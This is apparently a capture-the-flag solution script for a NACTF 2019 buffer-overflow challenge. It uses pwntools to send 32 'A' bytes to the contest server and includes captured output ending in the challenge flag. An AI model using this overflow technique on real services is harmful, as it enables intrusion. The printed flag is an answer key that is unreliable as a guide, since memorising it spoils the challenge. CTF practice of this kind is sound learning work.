from pwn import *

context.arch = 'i386'

con = remote('shell.2019.nactf.com', 31475)
con.recvregex('Type something>')

payload = 'A' * 32
con.sendline(payload)

print con.recvall()

'''
$ python bufover-0.py
[+] Opening connection to shell.2019.nactf.com on port 31475: Done
[+] Receiving all data: Done (98B)
[*] Closed connection to shell.2019.nactf.com port 31475
You typed AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
You win!
flag: nactf{0v3rfl0w_th4at_buff3r_18ghKusB}
'''
